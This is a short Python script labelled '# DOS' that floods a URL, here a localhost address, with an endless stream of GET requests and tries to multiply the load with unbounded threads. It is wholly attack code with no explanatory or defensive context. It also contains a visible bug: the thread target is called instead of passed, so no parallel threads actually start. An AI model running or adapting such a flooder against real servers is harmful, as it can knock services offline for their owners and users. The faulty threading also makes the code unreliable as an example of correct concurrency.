# DOS
import requests
import threading

url = 'http://127.0.0.1:8080/'


def send_requests():
    while 1:
        requests.get(url)
        print('send')


def create_threads():
    while 1:
        t = threading.Thread(target=send_requests())
        t.start()


if __name__ == "__main__":
    create_threads()
